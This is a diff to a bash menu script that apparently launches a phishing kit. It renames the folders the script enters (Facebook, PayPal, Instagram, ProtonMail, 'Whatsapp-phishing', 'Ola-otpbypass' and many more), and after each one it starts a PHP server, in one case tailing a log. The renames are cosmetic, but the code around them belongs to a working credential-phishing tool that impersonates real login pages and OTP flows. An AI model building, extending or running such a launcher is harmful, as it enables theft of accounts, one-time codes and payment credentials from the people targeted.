@@ -39,7 +39,7 @@ echo ""
 		 if [ $option = 01 ] || [ $option = 1 ]
                  then 
                            cd sites/ 
-                           cd tiktok/
+                           cd Tiktok/
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -86,7 +86,7 @@ echo ""
                   elif [ $option = 02 ] || [ $option = 2 ]
 	          then
 	                   cd sites/
-                           cd facebook/         
+                           cd Facebook/         
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -133,7 +133,7 @@ echo ""
                   elif [ $option = 03 ] || [ $option = 3 ]
 	          then
                            cd sites/
-                           cd instagram/
+                           cd Instagram/
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -228,7 +228,7 @@ echo ""
                 elif [ $option = 05 ] || [ $option = 5 ]
 	        then 
                            cd sites/
-                           cd ola-otpbypass/
+                           cd Ola-otpbypass/
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -376,7 +376,7 @@ echo ""
                           tail -f log.txt 
                    else
    
-                          cd signup/
+                          cd Signup/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -473,7 +473,7 @@ echo ""
 	        then
 
                           cd sites/
-                          cd instafollow/
+                          cd Instafollow/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -520,7 +520,7 @@ echo ""
                 elif [ $option = 10 ] || [ $option = 10 ]
 	        then
                           cd sites/
-                          cd amazonsign/
+                          cd Amazonsign/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -566,7 +566,7 @@ echo ""
                 elif [ $option = 11 ] || [ $option = 11 ]
 	        then
                           cd sites/
-                          cd whatsapp-phishing/
+                          cd Whatsapp-phishing/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -706,7 +706,7 @@ echo ""
                 elif [ $option = 14 ] || [ $option = 14 ]
 	        then
                           cd sites/
-                          cd spotify/
+                          cd Spotify/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -752,7 +752,7 @@ echo ""
                 elif [ $option = 15 ] || [ $option = 15 ]
 	        then
                           cd sites/
-                          cd github/
+                          cd Github/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -798,7 +798,7 @@ echo ""
                 elif [ $option = 16 ] || [ $option = 16 ]
 	        then
                           cd sites/
-                          cd ipfinder/
+                          cd Ipfinder/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -893,7 +893,7 @@ echo ""
 	        then
 
                           cd sites/
-                          cd phonepay/
+                          cd Phonepay/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -940,7 +940,7 @@ echo ""
                 elif [ $option = 19 ] || [ $option = 19 ]
 	        then
                           cd sites/
-                          cd paypal/
+                          cd Paypal/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -986,7 +986,7 @@ echo ""
                 elif [ $option = 20 ] || [ $option = 20 ]
 	        then
                           cd sites/
-                          cd telegram/
+                          cd Telegram/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1032,7 +1032,7 @@ echo ""
                 elif [ $option = 21 ] || [ $option = 21 ]
 	        then
                           cd sites/
-                          cd twitter/
+                          cd Twitter/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1078,7 +1078,7 @@ echo ""
                 elif [ $option = 22 ] || [ $option = 22 ]
 	        then
                           cd sites/
-                          cd flipcart/
+                          cd Flipcart/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1125,7 +1125,7 @@ echo ""
                 elif [ $option = 23 ] || [ $option = 23 ]
 	        then
                           cd sites/
-                          cd wordpress/
+                          cd Wordpress/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1172,7 +1172,7 @@ echo ""
                 elif [ $option = 24 ] || [ $option = 24 ]
 	        then
                           cd sites/
-                          cd snapchat/
+                          cd Snapchat/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1219,7 +1219,7 @@ echo ""
                 elif [ $option = 25 ] || [ $option = 25 ]
 	        then
                           cd sites/
-                          cd protonmail/
+                          cd Protonmail/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1267,7 +1267,7 @@ echo ""
 	        then
                
                           cd sites/
-                          cd stackoverflow/
+                          cd Stackoverflow/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1315,7 +1315,7 @@ echo ""
 	        then
 
                           cd sites/
-                          cd ebay/
+                          cd Ebay/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1362,7 +1362,7 @@ echo ""
                 elif [ $option = 28 ] || [ $option = 28 ]
 	        then
                           cd sites/
-                          cd twitch/
+                          cd Twitch/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1408,7 +1408,7 @@ echo ""
                 elif [ $option = 29 ] || [ $option = 29 ]
 	        then
                           cd sites/
-                          cd ajio/
+                          cd Ajio/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1455,7 +1455,7 @@ echo ""
                 elif [ $option = 30 ] || [ $option = 30 ]
 	        then
                           cd sites/
-                          cd cryptocurrency/
+                          cd Cryptocurrency/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1503,7 +1503,7 @@ echo ""
 	        then
                
                           cd sites/
-                          cd mobikwik/
+                          cd Mobikwik/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -1549,7 +1549,7 @@ echo ""
                 elif [ $option = 32 ] || [ $option = 32 ]
 	        then
                           cd sites/
-                          cd pinterest/
+                          cd Pinterest/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
